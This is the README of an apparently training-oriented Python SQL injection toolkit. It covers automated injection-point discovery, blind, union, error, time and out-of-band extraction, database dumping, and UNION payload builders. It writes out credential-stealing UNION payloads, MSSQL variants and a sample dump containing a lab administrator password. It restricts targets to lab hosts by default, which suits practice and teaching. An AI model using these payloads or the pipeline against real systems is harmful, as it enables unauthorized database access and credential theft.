# sqli_toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)

Interactive walkthrough + payload builders + automatic exploitation for
SQL injection practice. Built for PortSwigger Web Security Academy, your
own labs, or systems you have written permission to test.

## Contents

| File / dir                  | Purpose                                                    |
|-----------------------------|------------------------------------------------------------|
| `helper.py`                 | Main entry point (CLI + interactive walkthrough)           |
| `config.py`                 | `Config` dataclass — single source of tuning               |
| `exceptions.py`             | Typed errors (SessionExpired, WafBlocked, RateLimitHit…)   |
| `http_client.py`            | HTTP layer: retry, WAF, session, per-worker throttle       |
| `scanner.py`                | Injection-point discovery + break test                     |
| `auto.py`                   | Automatic exploitation pipeline                            |
| `binsearch.py`              | Binary-search extractors + `ProbeCache`                    |
| `channels/`                 | Pluggable channels: error, boolean, time, union, oob       |
| `union_builder.py`          | UNION SELECT payload builder                               |
| `pack_builder.py`           | Pack ASCII characters into INT / BIGINT                    |
| `cheatsheet.py`             | Static reference tables (fingerprint, concat, WAF, ...)    |
| `error_based.py`            | Thin re-export of `channels/error.py`                      |
| `rich_ui.py`                | Optional rich output (fallback to print)                   |
| `json_out.py`               | Machine-readable JSON + TSV/JSONL dump                     |
| `examples.py`               | Static payload samples                                     |
| `tests/`                    | pytest suite (88 tests)                                    |
| `pyproject.toml`            | Packaging, entry point, extras                             |

## Requirements

- Python 3.9+
- `requests`, `urllib3` (installed automatically)
- Optional: `rich` for nicer progress bars
- For tests: `pytest`

## Install

    pip install -e .              # core
    pip install -e ".[rich]"      # + rich progress bars
    pip install -e ".[dev]"       # + pytest

Entry point:

    sqli-toolkit --help

Or run as a module:

    python -m sqli_toolkit.helper

## Run

    python -m sqli_toolkit.helper             # interactive walkthrough
    python -m sqli_toolkit.cheatsheet         # full static cheatsheet
    python -m sqli_toolkit.examples           # static payload samples
    bash sqli_toolkit/run.sh helper

`run.sh` detects the package name from its own path, so it works even if
the directory was renamed.

## Auto mode

Each campaign is a folder containing `request.txt`, and optionally
`match.txt`, `words.txt`, `settings.json`:

    ps-blind-conditional/
    ├── request.txt      # raw HTTP request from Burp, with {{%payload%}} marker
    ├── match.txt        # boolean marker (optional; auto-detected if empty)
    ├── words.txt        # wordlist for username guessing (optional)
    └── settings.json    # rps, parallel, delay, timeout (optional)

Run:

    python -m sqli_toolkit.helper --auto sqli_toolkit/ps-blind-conditional --auto-marker

Or with the installed entry point:

    sqli-toolkit --auto sqli_toolkit/ps-blind-conditional --auto-marker

### `request.txt`

Paste a raw HTTP request. Put `{{%payload%}}` where the injection goes:

    GET /filter?category=Accessories HTTP/2
    Host: 0abc...web-security-academy.net
    Cookie: TrackingId=abc{{%payload%}}; session=xyz
    User-Agent: Mozilla/5.0 ...

If `{{%payload%}}` is absent, the scanner will try every URL param,
cookie, body field, and a handful of headers.

### `match.txt`

For boolean-based blind labs, put the response marker on a single line:

    Welcome back!

If empty, the toolkit will auto-detect the marker from a TRUE/FALSE diff.

### `settings.json`

    {
      "rps": 5,
      "parallel": 4,
      "delay": 5,
      "timeout": 30
    }

Priority: CLI > `settings.json` > defaults.

## What the auto pipeline does

1. **Discover** injection points (URL, cookie, body, headers).
2. **Break test** each point — pick the ones that respond to `'`.
3. **Detect channel**: error → boolean → time → union → oob.
4. **Fingerprint dialect**: MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
5. **Pre-flight sanity**: `1=1` must be TRUE, `1=2` must be FALSE.
6. **Extract** schema: table count, table names, column count, columns.
7. **Wordlist check** (optional): try each username in `words.txt`.
8. **Dump rows** for every hit, per column.
9. **Write results**:
   - `<campaign>/results/results_YYYYMMDD_HHMMSS.txt`
   - `<campaign>/results/summary.json`

Per-character progress is shown live:

    [table[0]  ]   3/5  [############>   ] ~1s left  'USE'
    --> USERS

## CLI flags

### Channel control

| Flag | Effect |
|------|--------|
| `--channel error,boolean,time,union,oob` | Force channel order |
| `--channel auto` | Default: try all in priority order |
| `--auto-marker` | Non-interactive boolean-marker pick (alias for `--non-interactive`) |

### HTTP behaviour

| Flag | Default | Effect |
|------|---------|--------|
| `--rps N` / `--max-rps N` | 10 | Hard cap on requests per second |
| `--max-total N` | 0 | Stop after N total requests (0=unlimited) |
| `--retries N` | 3 | HTTP retries per request (backoff 1s, 2s, 4s) |
| `--timeout N` | 30 | HTTP timeout per request |
| `--no-throttle` | off | Ignore `settings.json`'s `rps` |
| `--parallel N` | 1 | Extraction workers (sum stays under `--max-rps`) |

### Output

| Flag | Effect |
|------|--------|
| `--debug` | Write full trace to `<campaign>/debug/trace.log` |
| `--quiet` | Only print the final result |
| `--json-file PATH` | Where to write JSON (default: `results/summary.json`) |
| `--resume` | Load `<campaign>/debug/state.json` if present |

### Target safety

| Flag | Effect |
|------|--------|
| `--i-have-permission` | Allow non-lab targets (implies written authorization) |
| — | Allowlist by default: `*.web-security-academy.net`, `localhost`, `127.0.0.1` |

### OOB

| Flag | Effect |
|------|--------|
| `--oob-domain DOMAIN` | Enable OOB channel (requires a collaborator) |
| `--oob-wait N` | Seconds to wait for OOB callback |

## Output layout

    <campaign>/
    ├── request.txt
    ├── match.txt
    ├── words.txt
    ├── settings.json
    ├── results/
    │   ├── results_20261009_194717.txt
    │   └── summary.json
    └── debug/                       # only with --debug
        ├── trace.log
        └── state.json

### `summary.json` example

    {
      "campaign": "ps-blind-conditional",
      "dialect": "postgres",
      "technique": "boolean",
      "prefix": "'",
      "suffix": "'-- ",
      "marker": "Welcome back!",
      "target": "0abc...web-security-academy.net/filter?category=Accessories",
      "tables": {
        "_all_tables": {
          "columns": ["name"],
          "rows": [{"name": "USERS"}, {"name": "TRACKING"}]
        },
        "USERS": {
          "columns": ["USERNAME", "PASSWORD", "EMAIL"],
          "rows": [
            {
              "USERNAME": "administrator",
              "PASSWORD": "xhhblx5hpdiopf4rlc6i",
              "EMAIL": "(null)"
            }
          ]
        },
        "USERS.USERNAME.hits": {
          "columns": ["hit"],
          "rows": [
            {"hit": "administrator"},
            {"hit": "wiener"},
            {"hit": "carlos"}
          ]
        }
      },
      "errors": [],
      "started_at": "2026-10-09T19:34:41",
      "finished_at": "2026-10-09T19:39:59"
    }

## Channels

| Name | Technique | When it wins |
|------|-----------|--------------|
| `error` | Trigger SQL errors on TRUE | Error messages leak through the response |
| `boolean` | Response difference on TRUE/FALSE | A marker string appears only on TRUE |
| `time` | Response delay on TRUE | Nothing else works, but `SLEEP()`/`pg_sleep()` available |
| `union` | `UNION SELECT` returns rows inline | The page renders a query result |
| `oob` | DNS/HTTP callback | All above blocked, external collaborator available |

`--channel auto` (default) tries them in that order and stops at the
first working one. `--channel boolean,union` restricts and reorders.

## Configuration

All tuning lives in one dataclass, `sqli_toolkit.config.Config`. Use it
as a library:

    from sqli_toolkit import Config
    from sqli_toolkit.auto import run_auto

    cfg = Config(
        campaign_dir="labs/ps-blind-conditional",
        non_interactive=True,   # same as --auto-marker
        max_rps=5,
        parallel=4,
        permission_granted=True,
    )
    run_auto(cfg)

The old positional API is preserved (with `DeprecationWarning`):

    run_auto("labs/ps-blind-conditional", delay=5, debug=False)

## What `helper.py` does (walkthrough)

The interactive walkthrough follows the classic methodology, in order:

1. Confirm the injection and determine the context
   (string / numeric / LIKE).
2. Count the columns in the original SELECT
   (`ORDER BY N` / `UNION SELECT NULL,...`).
3. Determine the column types (`'a'` vs `NULL`, per column).
4. Fingerprint the DBMS (version query / error message / concat behaviour).
5. Extract data using one of three strategies:
   - `UNION SELECT` into a string column,
   - numeric packing into INT / BIGINT,
   - blind (boolean or time-based).

At every extraction step, the helper offers a menu to:

- retry the same table with different columns,
- try another table,
- go back to STEP 4 (DBMS), STEP 3 (types), or STEP 2 (columns),
- exit,
- show the full cheatsheet.

The cheatsheet is printed only on request, not automatically at the end.

### Context detection

STEP 1 distinguishes three contexts:

- **string** — input is embedded inside single quotes:
  `WHERE name = '<input>'`
  - break test: `'` gives an error, `'-- -` fixes it
- **numeric** — input is used as a number: `WHERE id = <input>`
  - break test: `1'` gives an error, `1 AND 1=1` works
- **LIKE** — input is inside a LIKE pattern: `WHERE name LIKE '%<input>%'`
  - break test: `%'` is needed to close the pattern

The context decides the prefix (`'` or `1` or `%'`) of every later payload.

### Backtracking

`step_string` returns a string that tells `run()` where to jump next:

| Return value | Meaning                                  |
|--------------|------------------------------------------|
| `None`       | normal end (show final cheatsheet)       |
| `"columns"`  | retry the same table with new columns    |
| `"table"`    | try another table                        |
| `"col_count"`| go back to STEP 2 (column count)         |
| `"col_type"` | go back to STEP 3 (column types)         |
| `"dbms"`     | go back to STEP 4 (fingerprint DBMS)     |
| `"exit"`     | exit the walkthrough                     |

### Column list

When asked for column names, enter them comma-separated:

    username
    username,password
    username,password,created_at
    id,username,password,email,created_at

Any number of columns is accepted. All values are concatenated with
the separator (`:-:` by default) into the output column.

### LIMIT 1 OFFSET N

After the payload is built, the helper also prints two ready-made
variants with `LIMIT 1 OFFSET 0` and `LIMIT 1 OFFSET 1`. Use these to
read rows one by one when the page shows only the first result.

## Building a UNION payload

    from sqli_toolkit import UnionBuilder

    sql = UnionBuilder(
        cols_total=3,
        string_cols=[1],
        layout={1: ["username", "password"]},
        dialect="mysql",
        sep=":-:",
        table="users",
    ).build()
    print(sql)

Output:

    ' UNION SELECT CONCAT(username,':-:',password),NULL,NULL FROM users-- -

Ready-made presets:

    from sqli_toolkit import tables_payload, columns_payload, data_payload

    tables_payload(3, 1, dialect="mysql")
    columns_payload(3, 1, "users", dialect="mysql")
    data_payload(3, [1], {1: ["username", "password"]}, "users", dialect="mysql")

## Advanced options (UnionBuilder)

### `force_func`

By default each dialect picks its natural concatenation form:

- MySQL / PostgreSQL / MSSQL use `CONCAT(...)`.
- Oracle / SQLite use the `||` operator.

`force_func=True` prefers `CONCAT(...)`.
`force_func=False` prefers the `||` operator.

The builder treats these as preferences, not absolute rules. If the
requested form is invalid for the dialect, a `UserWarning` is emitted
and the dialect-appropriate form is used instead.

Example:

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="mysql", force_func=False).build()
    # warns about PIPES_AS_CONCAT and returns (a || ':-:' || b)

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="oracle", sep=":-:",
                 force_func=True).build()
    # warns that Oracle CONCAT() takes at most 2 arguments
    # returns (a || ':-:' || b)

Use `quiet=True` to suppress the warning when you know what you are doing:

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="oracle", sep=":-:",
                 force_func=True, quiet=True).build()

### `null_safe`

When a part can be NULL (for example, an optional `email` column),
the whole `CONCAT` result becomes NULL on most engines. `null_safe=True`
wraps each part in `null_fn(x, '')`, so NULLs become empty strings.

    UnionBuilder(3, [1], {1: ["username", "email"]},
                 dialect="mysql", null_safe=True, null_fn="IFNULL").build()

    UnionBuilder(3, [1], {1: ["username", "email"]},
                 dialect="postgres", null_safe=True).build()

`null_fn` defaults to `COALESCE` (works in PostgreSQL, MSSQL, Oracle,
SQLite). Use `IFNULL` for MySQL.

## Dialect notes: MSSQL

MSSQL has a few quirks that affect how payloads must be written.

### `+` vs `CONCAT()`

The `+` operator concatenates strings, but requires both operands to
be strings. Mixing a number and a string raises a type error:

    SELECT 'user' + 42                     -- error
    SELECT 'user' + CAST(42 AS NVARCHAR)   -- ok

`CONCAT()` accepts mixed types (available from SQL Server 2012):

    SELECT CONCAT('user', 42)              -- 'user42'

`CONCAT()` also treats NULL as an empty string. With `+`, a NULL operand
makes the whole expression NULL:

    SELECT CONCAT('a', NULL, 'b')          -- 'ab'
    SELECT 'a' + NULL + 'b'                -- NULL

### `CONCAT_WS`

Since SQL Server 2017, `CONCAT_WS(separator, a, b, ...)` joins values
with a separator, skipping NULLs:

    SELECT CONCAT_WS(':-:', 'user', NULL, 'pwd')   -- 'user:-:pwd'

### Practical recommendation

For UNION-based extraction, prefer `CONCAT()`:

    ' UNION SELECT CONCAT(username, ':-:', password), NULL FROM users-- -

If `CONCAT()` is unavailable (SQL Server < 2012), use `+` with explicit
`CAST` on any numeric column:

    ' UNION SELECT username + ':-:' + CAST(id AS NVARCHAR), NULL FROM users-- -

### `information_schema`

MSSQL supports `information_schema` the same way as MySQL and PostgreSQL,
but `TOP 1` is used instead of `LIMIT 1`:

    SELECT TOP 1 table_name FROM information_schema.tables

Alternative system catalogs:

    SELECT name FROM sys.tables
    SELECT name FROM sys.objects WHERE type='U'
    SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')

## Packing ASCII into numbers

Packing groups several characters into one integer, useful when the
only injectable column is numeric.

    from sqli_toolkit import NumType, sql_pack_expr

    t = NumType("int")
    src = "(SELECT table_name FROM information_schema.tables LIMIT 1)"
    print(sql_pack_expr(src, 1, t.max_chars_7bit, bits=7, dialect="mysql"))

Unpacking on the local side:

    from sqli_toolkit import (
        pack_ascii_7bit, pack_ascii_8bit,
        unpack_ascii_7bit, unpack_ascii_8bit,
    )

    n = pack_ascii_7bit("user")
    print(n)                        # 247263986
    print(unpack_ascii_7bit(n, 4))  # user

    n = pack_ascii_8bit("user")
    print(n)                        # 1970496882
    print(unpack_ascii_8bit(n, 4))  # user

### Overflow validation

Both `pack_ascii_7bit` and `pack_ascii_8bit` accept an optional
`num_type`. When provided, the function raises `ValueError` if the
packed value would exceed `num_type.max_value`:

    from sqli_toolkit import NumType, pack_ascii_8bit

    t = NumType("int")
    pack_ascii_8bit("~~~~", num_type=t)    # ok, 2122219134 <= 2147483647
    pack_ascii_8bit("~~~~~", num_type=t)   # ValueError: exceeds int max_value

`sql_pack_expr` performs a similar check on the number of characters
versus the bit budget:

    t = NumType("int")
    sql_pack_expr("(SELECT 1)", 1, 5, bits=8, num_type=t)
    # ValueError: cannot pack 5 chars into int at 8 bits/char (max 4)

### Why prefer 7-bit packing for signed integers

| Type  | Bytes | 8-bit chars       | 7-bit chars |
|-------|-------|-------------------|-------------|
| byte  | 1     | 1                 | 1           |
| short | 2     | 2                 | 2           |
| int   | 4     | 4 (overflow risk) | 4 (safe)    |
| long  | 8     | 8                 | 9           |

`INT` is signed, so 4 characters at 8 bits can overflow into the sign
bit. 7-bit packing leaves one bit of headroom and never overflows for
printable ASCII.

## Reliability features

- **Retry with exponential backoff** on network errors (1s, 2s, 4s ± 20% jitter).
- **WAF detector**: 3+ consecutive 403/429/503 → halves `rps`. 10+ → aborts.
- **Session detector**: redirect to `/login` or baseline marker loss → `SessionExpired`.
- **Pre-flight sanity**: refuses to extract if `1=1`/`1=2` don't behave.
- **Per-worker throttle** (variant B): each worker gets `max_rps / parallel`,
  so the sum never exceeds `--max-rps`.
- **ProbeCache**: thread-safe LRU for `probe(condition)` results, saves
  10–20% of requests in blind channels.

## Disclaimer

For legal training only: PortSwigger Web Security Academy, your own labs,
or systems you have written permission to test. The toolkit refuses
non-lab hosts unless `--i-have-permission` is passed.